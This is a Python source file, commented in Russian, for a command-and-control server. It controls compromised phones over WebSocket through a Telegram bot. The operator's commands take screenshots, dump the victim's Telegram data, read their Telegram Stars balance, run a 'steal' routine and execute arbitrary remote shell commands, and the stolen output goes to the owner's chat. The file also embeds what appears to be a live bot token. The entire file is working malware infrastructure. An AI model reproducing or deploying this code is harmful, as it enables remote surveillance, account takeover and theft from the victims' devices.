# ═══════════════════════════════════════════════════════════════════════════
#  bot.py — C2-сервер на WebSocket для Render
#  Зависимости: aiohttp
#  start: python bot.py   (Render даёт $PORT)
#  endpoint: /ws   health: /
# ═══════════════════════════════════════════════════════════════════════════
import os
import asyncio
import struct
import json
import urllib.parse
import aiohttp
from aiohttp import web

BOT_TOKEN = '9176536071:AAEP7hXNB-b1mO0QJj3hN0NackMcKebnII8'
OWNER_ID  = '8275952252'
RECV_TIMEOUT = 20

API = f'https://api.telegram.org/bot{BOT_TOKEN}'

# ── состояние ─────────────────────────────────────────────────────────────
ws_conn: web.WebSocketResponse | None = None
ws_lock = asyncio.Lock()

# ── Telegram helpers ──────────────────────────────────────────────────────
async def tg_post(session, method, data=None, files=None):
    url = f'{API}/{method}'
    try:
        async with session.post(url, data=data) as r:
            return await r.json()
    except Exception as e:
        print(f'[-] TG {method}: {e}')
        return None

async def send_msg(session, text):
    await tg_post(session, 'sendMessage',
                  data={'chat_id': OWNER_ID, 'text': text})

async def send_buttons(session, text, buttons):
    await tg_post(session, 'sendMessage', data={
        'chat_id': OWNER_ID,
        'text': text,
        'reply_markup': json.dumps({'inline_keyboard': buttons}),
    })

async def answer_cb(session, cb_id):
    await tg_post(session, 'answerCallbackQuery',
                  data={'callback_query_id': cb_id})

async def send_doc(session, file_bytes, filename, caption):
    form = aiohttp.FormData()
    form.add_field('chat_id', OWNER_ID)
    form.add_field('caption', caption)
    form.add_field('document', file_bytes,
                   filename=filename,
                   content_type='application/octet-stream')
    try:
        async with session.post(f'{API}/sendDocument', data=form) as r:
            return await r.json()
    except Exception as e:
        print(f'[-] sendDoc: {e}')

# ── протокол: 8 байт LE + payload поверх WS ──────────────────────────────
async def ws_recv_exact(ws, n):
    buf = b''
    while len(buf) < n:
        try:
            msg = await asyncio.wait_for(ws.receive(), timeout=RECV_TIMEOUT)
        except asyncio.TimeoutError:
            return None
        if msg.type != aiohttp.WSMsgType.BINARY:
            if msg.type in (aiohttp.WSMsgType.CLOSE,
                            aiohttp.WSMsgType.CLOSED,
                            aiohttp.WSMsgType.ERROR):
                return None
            continue
        buf += msg.data
    return buf

async def execute_remote(session, cmd, caption, filename, as_text=False):
    print(f'[cmd] {cmd}')
    async with ws_lock:
        ws = ws_conn
    if ws is None or ws.closed:
        await send_msg(session, '[-] Нет подключенного устройства.')
        return

    try:
        await ws.send_str(cmd)
        hdr = await ws_recv_exact(ws, 8)
        if not hdr:
            await send_msg(session, f'[-] {cmd}: телефон не ответил.')
            return
        size = struct.unpack('<q', hdr)[0]
        if size <= 0:
            await send_msg(session, f'[+] {cmd}: пустой вывод.')
            return
        body = await ws_recv_exact(ws, size)
        if not body:
            await send_msg(session, '[-] Ошибка получения данных.')
            return

        if as_text:
            txt = body.decode('utf-8', 'replace').strip()
            if cmd == 'stars':
                await send_msg(session, f'Звезд: {txt}')
            else:
                await send_msg(session, f'{caption}\n{txt}')
        else:
            await send_doc(session, body, filename, caption)
    except Exception as e:
        await send_msg(session, f'[-] Ошибка сети ({cmd}): {e}')

# ── WS endpoint ───────────────────────────────────────────────────────────
async def ws_handler(request):
    global ws_conn
    ws = web.WebSocketResponse(heartbeat=25, max_msg_size=0)
    await ws.prepare(request)
    peer = request.remote
    print(f'[+] WS client from {peer}')

    async with ws_lock:
        if ws_conn and not ws_conn.closed:
            await ws_conn.close()
        ws_conn = ws

    async with aiohttp.ClientSession() as session:
        await send_buttons(session, f'🟢 Подключено устройство\nIP: {peer}', [
            [{'text': '📱 Инфо', 'callback_data': 'info'},
             {'text': '📸 Скрин', 'callback_data': 'screen'}],
            [{'text': '📁 Слить ТГ', 'callback_data': 'tg'},
             {'text': '⭐ Звёзды', 'callback_data': 'stars'}],
            [{'text': '💰 Steal', 'callback_data': 'steal'}],
            [{'text': '⚙️ Shell', 'callback_data': 'shell_help'}],
        ])

    async for msg in ws:
        pass  # телефон сам шлёт только ответы, читаем в execute_remote

    print(f'[-] WS client {peer} disconnected')
    return ws

# ── health ────────────────────────────────────────────────────────────────
async def health(request):
    return web.Response(text='Bot is running')

# ── Telegram long-poll ────────────────────────────────────────────────────
async def telegram_polling():
    offset = 0
    async with aiohttp.ClientSession() as session:
        await send_msg(session, '[*] C2 Бот запущен (WS).')
        while True:
            try:
                params = {'offset': offset, 'timeout': 20}
                async with session.get(f'{API}/getUpdates', params=params,
                                       timeout=aiohttp.ClientTimeout(total=30)) as r:
                    r_json = await r.json()
            except Exception as e:
                print(f'poll: {e}')
                await asyncio.sleep(3)
                continue
            if not r_json.get('ok'):
                await asyncio.sleep(2)
                continue
            for upd in r_json['result']:
                offset = upd['update_id'] + 1

                if 'callback_query' in upd:
                    cb = upd['callback_query']
                    if str(cb['message']['chat']['id']) != OWNER_ID:
                        continue
                    await answer_cb(session, cb['id'])
                    data = cb['data']
                    if data == 'info':
                        await execute_remote(session, 'info', 'Device info', 'info.txt', True)
                    elif data == 'screen':
                        await execute_remote(session, 'screen', 'Screen', 'screen.png')
                    elif data == 'tg':
                        await execute_remote(session, 'tg', 'TG Dump', 'tg_dump.tar.gz')
                    elif data == 'stars':
                        await execute_remote(session, 'stars', '⭐ Баланс', 'stars.txt', True)
                    elif data == 'steal':
                        await execute_remote(session, 'steal', '💰 Steal', 'steal.txt', True)
                    elif data == 'shell_help':
                        await send_msg(session, 'Отправь команду текстом:\n/shell <cmd>')
                    continue

                if 'message' not in upd:
                    continue
                msg = upd['message']
                if str(msg['chat']['id']) != OWNER_ID:
                    continue
                text = msg.get('text', '')
                if text == '/start':
                    await send_msg(session,
                        '/screen\n/tg\n/info\n/stars\n/steal\n/stars_debug\n/shell <cmd>')
                elif text == '/screen':
                    await execute_remote(session, 'screen', 'Screen', 'screen.png')
                elif text == '/tg':
                    await execute_remote(session, 'tg', 'TG Dump', 'tg_dump.tar.gz')
                elif text == '/info':
                    await execute_remote(session, 'info', 'Device info', 'info.txt', True)
                elif text == '/stars':
                    await execute_remote(session, 'stars', '⭐ Баланс', 'stars.txt', True)
                elif text == '/steal':
                    await execute_remote(session, 'steal', '💰 Steal', 'steal.txt', True)
                elif text == '/stars_debug':
                    await execute_remote(session, 'stars_debug', 'diag', 'diag.txt', True)
                elif text.startswith('/shell '):
                    c = text[7:]
                    await execute_remote(session, c, f'out: {c}', 'output.txt', True)

# ── main ──────────────────────────────────────────────────────────────────
async def main():
    app = web.Application()
    app.router.add_get('/ws', ws_handler)
    app.router.add_get('/', health)

    asyncio.create_task(telegram_polling())

    port = int(os.environ.get('PORT', 10000))
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f'[*] listening on {port}')
    await asyncio.Event().wait()

if __name__ == '__main__':
    asyncio.run(main())
